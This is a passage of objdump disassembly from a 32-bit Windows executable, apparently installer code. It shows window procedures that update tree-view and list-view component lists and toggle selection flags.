  40507b:	68 1c 11 00 00       	push   $0x111c
  405080:	ff 75 fc             	push   -0x4(%ebp)
  405083:	ff d6                	call   *%esi
  405085:	83 f8 10             	cmp    $0x10,%eax
  405088:	7d 0d                	jge    0x405097
  40508a:	57                   	push   %edi
  40508b:	6a 10                	push   $0x10
  40508d:	68 1b 11 00 00       	push   $0x111b
  405092:	ff 75 fc             	push   -0x4(%ebp)
  405095:	ff d6                	call   *%esi
  405097:	53                   	push   %ebx
  405098:	ff 15 54 80 40 00    	call   *0x408054
  40509e:	33 db                	xor    %ebx,%ebx
  4050a0:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4050a3:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  4050a6:	3b c7                	cmp    %edi,%eax
  4050a8:	74 27                	je     0x4050d1
  4050aa:	83 fb 20             	cmp    $0x20,%ebx
  4050ad:	74 03                	je     0x4050b2
  4050af:	89 7d f0             	mov    %edi,-0x10(%ebp)
  4050b2:	50                   	push   %eax
  4050b3:	57                   	push   %edi
  4050b4:	e8 36 15 00 00       	call   0x4065ef
  4050b9:	50                   	push   %eax
  4050ba:	57                   	push   %edi
  4050bb:	68 43 01 00 00       	push   $0x143
  4050c0:	ff 75 f8             	push   -0x8(%ebp)
  4050c3:	ff d6                	call   *%esi
  4050c5:	53                   	push   %ebx
  4050c6:	50                   	push   %eax
  4050c7:	68 51 01 00 00       	push   $0x151
  4050cc:	ff 75 f8             	push   -0x8(%ebp)
  4050cf:	ff d6                	call   *%esi
  4050d1:	43                   	inc    %ebx
  4050d2:	83 fb 21             	cmp    $0x21,%ebx
  4050d5:	7c c9                	jl     0x4050a0
  4050d7:	8b 5d 14             	mov    0x14(%ebp),%ebx
  4050da:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4050dd:	ff 74 83 30          	push   0x30(%ebx,%eax,4)
  4050e1:	6a 15                	push   $0x15
  4050e3:	ff 75 08             	push   0x8(%ebp)
  4050e6:	e8 46 f4 ff ff       	call   0x404531
  4050eb:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4050ee:	ff 74 83 34          	push   0x34(%ebx,%eax,4)
  4050f2:	6a 16                	push   $0x16
  4050f4:	ff 75 08             	push   0x8(%ebp)
  4050f7:	e8 35 f4 ff ff       	call   0x404531
  4050fc:	33 db                	xor    %ebx,%ebx
  4050fe:	39 3d 2c 47 43 00    	cmp    %edi,0x43472c
  405104:	89 7d f4             	mov    %edi,-0xc(%ebp)
  405107:	0f 8e ca 00 00 00    	jle    0x4051d7
  40510d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405110:	8d 50 08             	lea    0x8(%eax),%edx
  405113:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  405116:	8d 42 10             	lea    0x10(%edx),%eax
  405119:	66 39 38             	cmp    %di,(%eax)
  40511c:	0f 84 97 00 00 00    	je     0x4051b9
  405122:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405125:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  405128:	8b 02                	mov    (%edx),%eax
  40512a:	6a 20                	push   $0x20
  40512c:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  40512f:	59                   	pop    %ecx
  405130:	8b d0                	mov    %eax,%edx
  405132:	c7 45 b0 02 00 ff ff 	movl   $0xffff0002,-0x50(%ebp)
  405139:	23 d1                	and    %ecx,%edx
  40513b:	c7 45 b4 0d 00 00 00 	movl   $0xd,-0x4c(%ebp)
  405142:	a8 02                	test   $0x2,%al
  405144:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  405147:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  40514a:	89 55 bc             	mov    %edx,-0x44(%ebp)
  40514d:	74 3a                	je     0x405189
  40514f:	8d 45 ac             	lea    -0x54(%ebp),%eax
  405152:	c7 45 b4 4d 00 00 00 	movl   $0x4d,-0x4c(%ebp)
  405159:	50                   	push   %eax
  40515a:	57                   	push   %edi
  40515b:	68 32 11 00 00       	push   $0x1132
  405160:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  405167:	ff 75 fc             	push   -0x4(%ebp)
  40516a:	ff d6                	call   *%esi
  40516c:	8b 0d 60 ca 42 00    	mov    0x42ca60,%ecx
  405172:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  405179:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  40517c:	a1 60 ca 42 00       	mov    0x42ca60,%eax
  405181:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  405184:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405187:	eb 30                	jmp    0x4051b9
  405189:	a8 04                	test   $0x4,%al
  40518b:	74 14                	je     0x4051a1
  40518d:	ff 75 f4             	push   -0xc(%ebp)
  405190:	6a 03                	push   $0x3
  405192:	68 0a 11 00 00       	push   $0x110a
  405197:	ff 75 fc             	push   -0x4(%ebp)
  40519a:	ff d6                	call   *%esi
  40519c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40519f:	eb 18                	jmp    0x4051b9
  4051a1:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4051a4:	50                   	push   %eax
  4051a5:	57                   	push   %edi
  4051a6:	68 32 11 00 00       	push   $0x1132
  4051ab:	ff 75 fc             	push   -0x4(%ebp)
  4051ae:	ff d6                	call   *%esi
  4051b0:	8b 0d 60 ca 42 00    	mov    0x42ca60,%ecx
  4051b6:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  4051b9:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4051bc:	43                   	inc    %ebx
  4051bd:	81 c2 18 08 00 00    	add    $0x818,%edx
  4051c3:	3b 1d 2c 47 43 00    	cmp    0x43472c,%ebx
  4051c9:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4051cc:	0f 8c 44 ff ff ff    	jl     0x405116
  4051d2:	39 7d e0             	cmp    %edi,-0x20(%ebp)
  4051d5:	75 19                	jne    0x4051f0
  4051d7:	6a f0                	push   $0xfffffff0
  4051d9:	ff 75 fc             	push   -0x4(%ebp)
  4051dc:	ff 15 d4 81 40 00    	call   *0x4081d4
  4051e2:	24 fb                	and    $0xfb,%al
  4051e4:	50                   	push   %eax
  4051e5:	6a f0                	push   $0xfffffff0
  4051e7:	ff 75 fc             	push   -0x4(%ebp)
  4051ea:	ff 15 40 82 40 00    	call   *0x408240
  4051f0:	39 7d f0             	cmp    %edi,-0x10(%ebp)
  4051f3:	75 18                	jne    0x40520d
  4051f5:	6a 05                	push   $0x5
  4051f7:	ff 75 f8             	push   -0x8(%ebp)
  4051fa:	ff 15 28 82 40 00    	call   *0x408228
  405200:	ff 75 f8             	push   -0x8(%ebp)
  405203:	e8 5e f3 ff ff       	call   0x404566
  405208:	e9 89 03 00 00       	jmp    0x405596
  40520d:	ff 75 fc             	push   -0x4(%ebp)
  405210:	e8 51 f3 ff ff       	call   0x404566
  405215:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  40521c:	75 12                	jne    0x405230
  40521e:	33 c9                	xor    %ecx,%ecx
  405220:	89 7d 10             	mov    %edi,0x10(%ebp)
  405223:	41                   	inc    %ecx
  405224:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  40522b:	89 4d 14             	mov    %ecx,0x14(%ebp)
  40522e:	eb 03                	jmp    0x405233
  405230:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405233:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  405237:	b8 13 04 00 00       	mov    $0x413,%eax
  40523c:	74 09                	je     0x405247
  40523e:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405241:	0f 85 e4 00 00 00    	jne    0x40532b
  405247:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40524a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40524d:	74 0d                	je     0x40525c
  40524f:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  405256:	0f 85 cf 00 00 00    	jne    0x40532b
  40525c:	f6 05 19 47 43 00 02 	testb  $0x2,0x434719
  405263:	75 73                	jne    0x4052d8
  405265:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405268:	74 09                	je     0x405273
  40526a:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40526d:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  405271:	75 65                	jne    0x4052d8
  405273:	33 c9                	xor    %ecx,%ecx
  405275:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405278:	0f 95 c1             	setne  %cl
  40527b:	51                   	push   %ecx
  40527c:	ff 75 fc             	push   -0x4(%ebp)
  40527f:	e8 68 fc ff ff       	call   0x404eec
  405284:	8b d8                	mov    %eax,%ebx
  405286:	3b df                	cmp    %edi,%ebx
  405288:	7c 4e                	jl     0x4052d8
  40528a:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  405290:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405293:	8d 4c 08 08          	lea    0x8(%eax,%ecx,1),%ecx
  405297:	8b 01                	mov    (%ecx),%eax
  405299:	a8 10                	test   $0x10,%al
  40529b:	75 3b                	jne    0x4052d8
  40529d:	a8 40                	test   $0x40,%al
  40529f:	74 11                	je     0x4052b2
  4052a1:	35 80 00 00 00       	xor    $0x80,%eax
  4052a6:	84 c0                	test   %al,%al
  4052a8:	79 04                	jns    0x4052ae
  4052aa:	0c 01                	or     $0x1,%al
  4052ac:	eb 07                	jmp    0x4052b5
  4052ae:	24 fe                	and    $0xfe,%al
  4052b0:	eb 03                	jmp    0x4052b5
  4052b2:	83 f0 01             	xor    $0x1,%eax
  4052b5:	53                   	push   %ebx
  4052b6:	89 01                	mov    %eax,(%ecx)
  4052b8:	e8 c0 be ff ff       	call   0x40117d
  4052bd:	a1 18 47 43 00       	mov    0x434718,%eax
  4052c2:	43                   	inc    %ebx
  4052c3:	f7 d0                	not    %eax
  4052c5:	c1 e8 08             	shr    $0x8,%eax
  4052c8:	83 e0 01             	and    $0x1,%eax
  4052cb:	89 5d 10             	mov    %ebx,0x10(%ebp)
  4052ce:	89 45 14             	mov    %eax,0x14(%ebp)
  4052d1:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4052d8:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  4052db:	74 4e                	je     0x40532b
  4052dd:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4052e0:	81 78 08 3d fe ff ff 	cmpl   $0xfffffe3d,0x8(%eax)
  4052e7:	75 0e                	jne    0x4052f7
  4052e9:	ff 70 5c             	push   0x5c(%eax)
  4052ec:	57                   	push   %edi
  4052ed:	68 19 04 00 00       	push   $0x419
  4052f2:	ff 75 fc             	push   -0x4(%ebp)
  4052f5:	ff d6                	call   *%esi
  4052f7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4052fa:	81 78 08 39 fe ff ff 	cmpl   $0xfffffe39,0x8(%eax)
  405301:	75 28                	jne    0x40532b
  405303:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  405307:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40530a:	8b 40 5c             	mov    0x5c(%eax),%eax
  40530d:	75 0f                	jne    0x40531e
  40530f:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  405315:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  405319:	83 08 20             	orl    $0x20,(%eax)
  40531c:	eb 0d                	jmp    0x40532b
  40531e:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  405324:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  405328:	83 20 df             	andl   $0xffffffdf,(%eax)
  40532b:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  405332:	75 6f                	jne    0x4053a3
  405334:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  40533a:	0f 85 56 02 00 00    	jne    0x405596
  405340:	8b 45 10             	mov    0x10(%ebp),%eax
  405343:	c1 e8 10             	shr    $0x10,%eax
  405346:	66 3d 01 00          	cmp    $0x1,%ax
  40534a:	0f 85 46 02 00 00    	jne    0x405596
  405350:	57                   	push   %edi
  405351:	57                   	push   %edi
  405352:	68 47 01 00 00       	push   $0x147
  405357:	ff 75 f8             	push   -0x8(%ebp)
  40535a:	ff d6                	call   *%esi
  40535c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40535f:	0f 84 31 02 00 00    	je     0x405596
  405365:	57                   	push   %edi
  405366:	50                   	push   %eax
  405367:	68 50 01 00 00       	push   $0x150
  40536c:	ff 75 f8             	push   -0x8(%ebp)
  40536f:	ff d6                	call   *%esi
  405371:	8b d8                	mov    %eax,%ebx
  405373:	83 fb ff             	cmp    $0xffffffff,%ebx
  405376:	74 08                	je     0x405380
  405378:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40537b:	39 3c 98             	cmp    %edi,(%eax,%ebx,4)
  40537e:	75 03                	jne    0x405383
  405380:	6a 20                	push   $0x20
  405382:	5b                   	pop    %ebx
  405383:	53                   	push   %ebx
  405384:	e8 10 bf ff ff       	call   0x401299
  405389:	53                   	push   %ebx
  40538a:	57                   	push   %edi
  40538b:	68 20 04 00 00       	push   $0x420
  405390:	ff 75 08             	push   0x8(%ebp)
  405393:	ff d6                	call   *%esi
  405395:	83 4d 10 ff          	orl    $0xffffffff,0x10(%ebp)
  405399:	89 7d 14             	mov    %edi,0x14(%ebp)
  40539c:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4053a3:	b8 00 02 00 00       	mov    $0x200,%eax
  4053a8:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4053ab:	75 08                	jne    0x4053b5
  4053ad:	57                   	push   %edi
  4053ae:	57                   	push   %edi
  4053af:	50                   	push   %eax
  4053b0:	ff 75 fc             	push   -0x4(%ebp)
  4053b3:	ff d6                	call   *%esi
  4053b5:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  4053bc:	75 32                	jne    0x4053f0
  4053be:	a1 4c ca 42 00       	mov    0x42ca4c,%eax
  4053c3:	3b c7                	cmp    %edi,%eax
  4053c5:	74 07                	je     0x4053ce
  4053c7:	50                   	push   %eax
  4053c8:	ff 15 34 80 40 00    	call   *0x408034
  4053ce:	a1 60 ca 42 00       	mov    0x42ca60,%eax
  4053d3:	3b c7                	cmp    %edi,%eax
  4053d5:	74 07                	je     0x4053de
  4053d7:	50                   	push   %eax
  4053d8:	ff 15 0c 81 40 00    	call   *0x40810c
  4053de:	89 3d 4c ca 42 00    	mov    %edi,0x42ca4c
  4053e4:	89 3d 60 ca 42 00    	mov    %edi,0x42ca60
  4053ea:	89 3d 60 47 43 00    	mov    %edi,0x434760
  4053f0:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  4053f7:	0f 85 5b 01 00 00    	jne    0x405558
  4053fd:	57                   	push   %edi
  4053fe:	57                   	push   %edi
  4053ff:	e8 eb bd ff ff       	call   0x4011ef
  405404:	8b 45 10             	mov    0x10(%ebp),%eax
  405407:	3b c7                	cmp    %edi,%eax
  405409:	74 0e                	je     0x405419
  40540b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40540e:	74 01                	je     0x405411
  405410:	48                   	dec    %eax
  405411:	50                   	push   %eax
  405412:	6a 08                	push   $0x8
  405414:	e8 53 fb ff ff       	call   0x404f6c
  405419:	39 7d 14             	cmp    %edi,0x14(%ebp)
  40541c:	74 3f                	je     0x40545d
  40541e:	ff 35 60 ca 42 00    	push   0x42ca60
  405424:	e8 b9 be ff ff       	call   0x4012e2
  405429:	8b d8                	mov    %eax,%ebx
  40542b:	53                   	push   %ebx
  40542c:	e8 68 be ff ff       	call   0x401299
  405431:	33 c0                	xor    %eax,%eax
  405433:	33 c9                	xor    %ecx,%ecx
  405435:	3b df                	cmp    %edi,%ebx
  405437:	7e 0e                	jle    0x405447
  405439:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40543c:	39 3c 82             	cmp    %edi,(%edx,%eax,4)
  40543f:	74 01                	je     0x405442
  405441:	41                   	inc    %ecx
  405442:	40                   	inc    %eax
  405443:	3b c3                	cmp    %ebx,%eax
  405445:	7c f2                	jl     0x405439
  405447:	57                   	push   %edi
  405448:	51                   	push   %ecx
  405449:	68 4e 01 00 00       	push   $0x14e
  40544e:	ff 75 f8             	push   -0x8(%ebp)
  405451:	ff d6                	call   *%esi
  405453:	89 5d 14             	mov    %ebx,0x14(%ebp)
  405456:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  40545d:	57                   	push   %edi
  40545e:	57                   	push   %edi
  40545f:	e8 8b bd ff ff       	call   0x4011ef
  405464:	a1 60 ca 42 00       	mov    0x42ca60,%eax
  405469:	39 3d 2c 47 43 00    	cmp    %edi,0x43472c
  40546f:	89 45 e0             	mov    %eax,-0x20(%ebp)
  405472:	a1 28 47 43 00       	mov    0x434728,%eax
  405477:	c7 45 c4 30 f0 00 00 	movl   $0xf030,-0x3c(%ebp)
  40547e:	89 7d ec             	mov    %edi,-0x14(%ebp)
  405481:	0f 8e 9c 00 00 00    	jle    0x405523
  405487:	8d 58 08             	lea    0x8(%eax),%ebx
  40548a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40548d:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405490:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  405493:	3b c7                	cmp    %edi,%eax
  405495:	74 74                	je     0x40550b
  405497:	8b 0b                	mov    (%ebx),%ecx
  405499:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40549c:	f6 c5 01             	test   $0x1,%ch
  40549f:	c7 45 b8 08 00 00 00 	movl   $0x8,-0x48(%ebp)
  4054a6:	74 11                	je     0x4054b9
  4054a8:	8d 43 10             	lea    0x10(%ebx),%eax
  4054ab:	c7 45 b8 09 00 00 00 	movl   $0x9,-0x48(%ebp)
  4054b2:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4054b5:	80 63 01 fe          	andb   $0xfe,0x1(%ebx)
  4054b9:	f6 c1 40             	test   $0x40,%cl
  4054bc:	74 05                	je     0x4054c3
  4054be:	6a 03                	push   $0x3
  4054c0:	58                   	pop    %eax
  4054c1:	eb 0e                	jmp    0x4054d1
  4054c3:	8b c1                	mov    %ecx,%eax
  4054c5:	83 e0 01             	and    $0x1,%eax
  4054c8:	40                   	inc    %eax
  4054c9:	f6 c1 10             	test   $0x10,%cl
  4054cc:	74 03                	je     0x4054d1
  4054ce:	83 c0 03             	add    $0x3,%eax
  4054d1:	8b d1                	mov    %ecx,%edx
  4054d3:	ff 75 bc             	push   -0x44(%ebp)
  4054d6:	c1 e0 0b             	shl    $0xb,%eax
  4054d9:	83 e2 08             	and    $0x8,%edx
  4054dc:	0b c2                	or     %edx,%eax
  4054de:	8b d1                	mov    %ecx,%edx
  4054e0:	c1 f9 05             	sar    $0x5,%ecx
  4054e3:	03 c0                	add    %eax,%eax
  4054e5:	83 e2 20             	and    $0x20,%edx
  4054e8:	83 e1 01             	and    $0x1,%ecx
  4054eb:	0b c2                	or     %edx,%eax
  4054ed:	41                   	inc    %ecx
  4054ee:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4054f1:	51                   	push   %ecx
  4054f2:	68 02 11 00 00       	push   $0x1102
  4054f7:	ff 75 fc             	push   -0x4(%ebp)
  4054fa:	ff d6                	call   *%esi
  4054fc:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4054ff:	50                   	push   %eax
  405500:	57                   	push   %edi
  405501:	68 3f 11 00 00       	push   $0x113f
  405506:	ff 75 fc             	push   -0x4(%ebp)
  405509:	ff d6                	call   *%esi
  40550b:	ff 45 ec             	incl   -0x14(%ebp)
  40550e:	81 c3 18 08 00 00    	add    $0x818,%ebx
  405514:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405517:	3b 05 2c 47 43 00    	cmp    0x43472c,%eax
  40551d:	0f 8c 67 ff ff ff    	jl     0x40548a
  405523:	66 81 3d be 47 43 00 	cmpw   $0x400,0x4347be
  40552a:	00 04 
  40552c:	75 0c                	jne    0x40553a
  40552e:	6a 01                	push   $0x1
  405530:	57                   	push   %edi
  405531:	ff 75 fc             	push   -0x4(%ebp)
  405534:	ff 15 54 82 40 00    	call   *0x408254
  40553a:	a1 dc 36 43 00       	mov    0x4336dc,%eax
  40553f:	39 78 10             	cmp    %edi,0x10(%eax)
  405542:	74 14                	je     0x405558
  405544:	6a 05                	push   $0x5
  405546:	e8 74 f9 ff ff       	call   0x404ebf
  40554b:	50                   	push   %eax
  40554c:	6a fb                	push   $0xfffffffb
  40554e:	68 ff 03 00 00       	push   $0x3ff
  405553:	e8 4f f9 ff ff       	call   0x404ea7
  405558:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  40555f:	75 35                	jne    0x405596
  405561:	f6 05 19 47 43 00 01 	testb  $0x1,0x434719
  405568:	74 2c                	je     0x405596
  40556a:	33 c0                	xor    %eax,%eax
  40556c:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  405570:	8b 35 28 82 40 00    	mov    0x408228,%esi
  405576:	0f 94 c0             	sete   %al
  405579:	c1 e0 03             	shl    $0x3,%eax
  40557c:	8b f8                	mov    %eax,%edi
  40557e:	57                   	push   %edi
  40557f:	ff 75 fc             	push   -0x4(%ebp)
  405582:	ff d6                	call   *%esi
  405584:	57                   	push   %edi
  405585:	68 fe 03 00 00       	push   $0x3fe
  40558a:	ff 75 08             	push   0x8(%ebp)
  40558d:	ff 15 3c 82 40 00    	call   *0x40823c
  405593:	50                   	push   %eax
  405594:	ff d6                	call   *%esi
  405596:	ff 75 14             	push   0x14(%ebp)
  405599:	ff 75 10             	push   0x10(%ebp)
  40559c:	ff 75 0c             	push   0xc(%ebp)
  40559f:	e8 f4 ef ff ff       	call   0x404598
  4055a4:	5f                   	pop    %edi
  4055a5:	5e                   	pop    %esi
  4055a6:	5b                   	pop    %ebx
  4055a7:	c9                   	leave
  4055a8:	c2 10 00             	ret    $0x10
  4055ab:	55                   	push   %ebp
  4055ac:	8b ec                	mov    %esp,%ebp
  4055ae:	53                   	push   %ebx
  4055af:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4055b2:	81 fb 02 01 00 00    	cmp    $0x102,%ebx
  4055b8:	57                   	push   %edi
  4055b9:	75 14                	jne    0x4055cf
  4055bb:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  4055bf:	75 59                	jne    0x40561a
  4055c1:	68 13 04 00 00       	push   $0x413
  4055c6:	e8 b2 ef ff ff       	call   0x40457d
  4055cb:	33 c0                	xor    %eax,%eax
  4055cd:	eb 62                	jmp    0x405631
  4055cf:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  4055d5:	75 20                	jne    0x4055f7
  4055d7:	ff 75 08             	push   0x8(%ebp)
  4055da:	ff 15 b4 81 40 00    	call   *0x4081b4
  4055e0:	85 c0                	test   %eax,%eax
  4055e2:	74 36                	je     0x40561a
  4055e4:	6a 01                	push   $0x1
  4055e6:	ff 75 08             	push   0x8(%ebp)
  4055e9:	e8 fe f8 ff ff       	call   0x404eec
  4055ee:	8b f8                	mov    %eax,%edi
  4055f0:	bb 19 04 00 00       	mov    $0x419,%ebx
  4055f5:	eb 03                	jmp    0x4055fa
  4055f7:	8b 7d 14             	mov    0x14(%ebp),%edi
  4055fa:	81 fb 19 04 00 00    	cmp    $0x419,%ebx
  405600:	75 1b                	jne    0x40561d
  405602:	39 3d 54 ca 42 00    	cmp    %edi,0x42ca54
  405608:	74 13                	je     0x40561d
  40560a:	57                   	push   %edi
  40560b:	6a 06                	push   $0x6
  40560d:	89 3d 54 ca 42 00    	mov    %edi,0x42ca54
  405613:	e8 54 f9 ff ff       	call   0x404f6c
  405618:	eb 03                	jmp    0x40561d
  40561a:	8b 7d 14             	mov    0x14(%ebp),%edi
  40561d:	57                   	push   %edi
  40561e:	ff 75 10             	push   0x10(%ebp)
  405621:	53                   	push   %ebx
  405622:	ff 75 08             	push   0x8(%ebp)
  405625:	ff 35 5c ca 42 00    	push   0x42ca5c
  40562b:	ff 15 b8 81 40 00    	call   *0x4081b8
  405631:	5f                   	pop    %edi
  405632:	5b                   	pop    %ebx
  405633:	5d                   	pop    %ebp
  405634:	c2 10 00             	ret    $0x10
  405637:	55                   	push   %ebp
  405638:	8b ec                	mov    %esp,%ebp
  40563a:	83 ec 30             	sub    $0x30,%esp
  40563d:	a1 e4 36 43 00       	mov    0x4336e4,%eax
  405642:	53                   	push   %ebx
  405643:	56                   	push   %esi
  405644:	57                   	push   %edi
  405645:	33 ff                	xor    %edi,%edi
  405647:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40564a:	3b c7                	cmp    %edi,%eax
  40564c:	0f 84 b1 00 00 00    	je     0x405703
  405652:	8b 1d b4 47 43 00    	mov    0x4347b4,%ebx
  405658:	be 48 ba 42 00       	mov    $0x42ba48,%esi
  40565d:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  405660:	83 e3 01             	and    $0x1,%ebx
  405663:	75 09                	jne    0x40566e
  405665:	ff 75 08             	push   0x8(%ebp)
  405668:	56                   	push   %esi
  405669:	e8 81 0f 00 00       	call   0x4065ef
  40566e:	56                   	push   %esi
  40566f:	e8 54 0f 00 00       	call   0x4065c8
  405674:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  405677:	89 45 08             	mov    %eax,0x8(%ebp)
  40567a:	74 1b                	je     0x405697
  40567c:	ff 75 0c             	push   0xc(%ebp)
  40567f:	e8 44 0f 00 00       	call   0x4065c8
  405684:	03 45 08             	add    0x8(%ebp),%eax
  405687:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40568c:	73 75                	jae    0x405703
  40568e:	ff 75 0c             	push   0xc(%ebp)
  405691:	56                   	push   %esi
  405692:	e8 37 0f 00 00       	call   0x4065ce
  405697:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  40569b:	75 0d                	jne    0x4056aa
  40569d:	56                   	push   %esi
  40569e:	ff 35 c8 36 43 00    	push   0x4336c8
  4056a4:	ff 15 1c 82 40 00    	call   *0x40821c
  4056aa:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  4056ae:	75 44                	jne    0x4056f4
  4056b0:	57                   	push   %edi
  4056b1:	57                   	push   %edi
  4056b2:	68 04 10 00 00       	push   $0x1004
  4056b7:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4056ba:	ff 75 fc             	push   -0x4(%ebp)
  4056bd:	8b 35 58 82 40 00    	mov    0x408258,%esi
  4056c3:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  4056ca:	ff d6                	call   *%esi
  4056cc:	2b c3                	sub    %ebx,%eax
  4056ce:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4056d1:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4056d4:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4056d7:	50                   	push   %eax
  4056d8:	b8 4d 10 00 00       	mov    $0x104d,%eax
  4056dd:	2b c3                	sub    %ebx,%eax
  4056df:	57                   	push   %edi
  4056e0:	50                   	push   %eax
  4056e1:	ff 75 fc             	push   -0x4(%ebp)
  4056e4:	ff d6                	call   *%esi
  4056e6:	57                   	push   %edi
  4056e7:	ff 75 d4             	push   -0x2c(%ebp)
  4056ea:	68 13 10 00 00       	push   $0x1013
  4056ef:	ff 75 fc             	push   -0x4(%ebp)
  4056f2:	ff d6                	call   *%esi
  4056f4:	3b df                	cmp    %edi,%ebx
  4056f6:	74 0b                	je     0x405703
  4056f8:	8b 45 08             	mov    0x8(%ebp),%eax
  4056fb:	66 89 3c 45 48 ba 42 	mov    %di,0x42ba48(,%eax,2)
  405702:	00 
  405703:	5f                   	pop    %edi
  405704:	5e                   	pop    %esi
  405705:	5b                   	pop    %ebx
  405706:	c9                   	leave
  405707:	c2 08 00             	ret    $0x8
  40570a:	56                   	push   %esi
  40570b:	8b 35 28 47 43 00    	mov    0x434728,%esi
  405711:	57                   	push   %edi
  405712:	8b 3d 2c 47 43 00    	mov    0x43472c,%edi
  405718:	6a 00                	push   $0x0
  40571a:	ff 15 98 82 40 00    	call   *0x408298
  405720:	09 05 c0 47 43 00    	or     %eax,0x4347c0
  405726:	6a 00                	push   $0x0
  405728:	e8 50 ee ff ff       	call   0x40457d
  40572d:	85 ff                	test   %edi,%edi
  40572f:	74 2b                	je     0x40575c
  405731:	83 c6 0c             	add    $0xc,%esi
  405734:	4f                   	dec    %edi
  405735:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  405739:	74 0f                	je     0x40574a
  40573b:	ff 74 24 0c          	push   0xc(%esp)
  40573f:	ff 36                	push   (%esi)
  405741:	e8 43 bc ff ff       	call   0x401389
  405746:	85 c0                	test   %eax,%eax
  405748:	75 0c                	jne    0x405756
  40574a:	81 c6 18 08 00 00    	add    $0x818,%esi
  405750:	85 ff                	test   %edi,%edi
  405752:	75 e0                	jne    0x405734
  405754:	eb 06                	jmp    0x40575c
  405756:	ff 05 8c 47 43 00    	incl   0x43478c
  40575c:	68 04 04 00 00       	push   $0x404
  405761:	e8 17 ee ff ff       	call   0x40457d
  405766:	ff 15 94 82 40 00    	call   *0x408294
  40576c:	a1 8c 47 43 00       	mov    0x43478c,%eax
  405771:	5f                   	pop    %edi
  405772:	5e                   	pop    %esi
  405773:	c2 04 00             	ret    $0x4
  405776:	55                   	push   %ebp
  405777:	8b ec                	mov    %esp,%ebp
  405779:	83 ec 40             	sub    $0x40,%esp
  40577c:	53                   	push   %ebx
  40577d:	56                   	push   %esi
  40577e:	8b 35 e4 36 43 00    	mov    0x4336e4,%esi
  405784:	33 db                	xor    %ebx,%ebx
